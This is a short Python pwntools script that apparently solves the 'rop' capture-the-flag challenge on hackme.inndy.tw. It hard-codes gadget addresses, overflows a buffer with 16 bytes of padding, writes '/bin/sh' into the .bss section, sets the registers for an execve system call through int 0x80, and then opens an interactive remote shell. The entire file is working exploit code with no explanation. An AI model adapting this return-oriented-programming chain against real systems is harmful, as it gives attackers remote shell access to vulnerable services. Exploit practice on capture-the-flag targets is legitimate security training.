from pwn import *

a=remote("hackme.inndy.tw",7704)
elf=ELF("rop")
int0x80=0x0806c943
pop_eax_ret=0x080b8016
pop_ebx_ret=0x080481c9
pop_ecx_ret=0x080de769
pop_edx_ret=0x0806ecda
pop3_ret=0x0806ecd8
read_addr=0x806d290
bss_addr=0x80EAF80
pop_write2ecx = 0x0804b5ba#pop dword ptr [ecx],ret
padding=16
sh=0x808bcb9
payload='A'*16
'''
payload+=p32(read_addr)
payload+=p32(pop3_ret)
payload+=p32(0)
payload+=p32(bss_addr)
payload+=p32(10)
'''
payload += p32(pop_ecx_ret) + p32(bss_addr)
payload += p32(pop_write2ecx) + '/bin'
payload += p32(pop_ecx_ret) + p32(bss_addr+4)
payload += p32(pop_write2ecx) + '/sh\x00'
payload+=p32(pop_eax_ret)
payload+=p32(0x0b)
payload+=p32(pop_ebx_ret)
payload+=p32(bss_addr)
payload+=p32(pop_ecx_ret)
payload+=p32(0)
payload+=p32(pop_edx_ret)
payload+=p32(0)
payload+=p32(int0x80)

a.sendline(payload)
#sleep(0.01)
#a.sendline("/bin/sh\x00")
a.interactive()


